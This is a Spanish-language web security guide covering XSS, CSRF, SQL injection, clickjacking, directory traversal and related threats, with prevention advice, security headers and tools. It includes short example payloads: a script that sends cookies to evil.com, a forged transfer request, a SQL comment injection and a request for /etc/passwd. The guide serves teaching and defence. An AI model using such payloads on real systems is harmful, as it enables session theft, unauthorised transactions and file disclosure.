# Seguridad en la Web
Es el conjunto de prácticas, técnicas y controles que protegen a las aplicaciones web, usuarios y servidores contra ataques, acceso no autorizado, robo de datos y manipulación maliciosa.

## Principales amenazas de seguridad web
1. XSS (Cross-Site Scripting)
El atacante inyecta JavaScript malicioso en una página confiable para robar datos del usuario (como cookies, sesiones, etc.).

Ejemplo
```html
<script>fetch('http://evil.com?cookie=' + document.cookie)</script>
```
Prevención:
Escapar el HTML (<, >, &, ").

Usar frameworks con protección integrada: React, Angular, Vue.

Configurar Content-Security-Policy headers.

Validar y sanear inputs de usuarios.

2. CSRF (Cross-Site Request Forgery)
Un atacante hace que un usuario autenticado ejecute acciones no deseadas en una app (como transferencias o cambios de contraseña).

Ejemplo
```html
<img src="https://tuapp.com/transferir?monto=1000&to=attacker" />
```
Prevención:
Usar tokens CSRF únicos y válidos por sesión.

Usar cookies con atributos SameSite=Strict.

Requiere autenticación adicional en acciones sensibles.

3.  SQL Injection
Inyección de código SQL malicioso a través de inputs manipulados.

🔍 Ejemplo:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '123'
```
Prevención:
Usar consultas preparadas / parametrizadas.

Nunca concatenar strings para construir SQL.

Validar tipos y formato de los datos recibidos.

4. HTTPS & TLS (Transport Layer Security)
HTTPS encripta la conexión entre cliente y servidor, impidiendo la intercepción (sniffing) y modificación de datos en tránsito.

✅ Mejores prácticas:
Fuerza HTTPS en toda la app.

Usa certificados válidos (Let's Encrypt, AWS ACM, etc.).

Activa HSTS: Strict-Transport-Security header.

5. Clickjacking
El atacante incrusta tu sitio dentro de un iframe oculto y engaña al usuario para hacer clic en botones invisibles.

✅ Prevención:
Agregar el header X-Frame-Options: DENY

Usar Content-Security-Policy: frame-ancestors 'none'

6. Directory Traversal
El atacante accede a archivos fuera del directorio permitido.

Ejemplo
```bash
GET /download?file=../../etc/passwd
```
Prevención:
Restringir rutas válidas.

Normalizar rutas y validar nombres.

Usar métodos seguros para acceso a archivos.

7. Security Misconfiguration
Configuraciones inseguras en servidores, frameworks o plataformas.

✅ Recomendaciones:
Eliminar endpoints de debug (ej. /actuator, /phpinfo).

Desactivar listado de directorios.

Actualizar dependencias con parches de seguridad.

Deshabilitar headers como X-Powered-By.

8. Broken Authentication
Fallos en la gestión de sesiones o contraseñas que permiten el secuestro de cuentas.

✅ Buenas prácticas:
Hash de contraseñas con bcrypt/scrypt/argon2.

Caducar sesiones tras logout o inactividad.

Multi-factor authentication (MFA).

Limitar intentos de login (Rate Limiting).

## Cabeceras HTTP de seguridad esenciales
￼
Header	Propósito
Content-Security-Policy	Previene XSS, define recursos permitidos
Strict-Transport-Security	Fuerza HTTPS permanente
X-Content-Type-Options	Previene sniffing de MIME types
X-Frame-Options	Previene clickjacking
X-XSS-Protection	Habilita filtros básicos XSS
Referrer-Policy	Controla qué se comparte en el header Referer

## Autenticación segura
Usa librerías como OAuth2, OpenID Connect.

Nunca almacenes contraseñas en texto plano.

Almacena tokens en cookies HttpOnly + Secure.

Usa roles y scopes para autorización granular.

## Herramientas para análisis de seguridad
🔍 OWASP ZAP — Escáner de seguridad gratuito.

🔐 Burp Suite — Pruebas de pentesting web.

⚙️ npm audit / Snyk — Revisión de vulnerabilidades en dependencias.

🔧 helmet (Express) — Protege con headers seguros.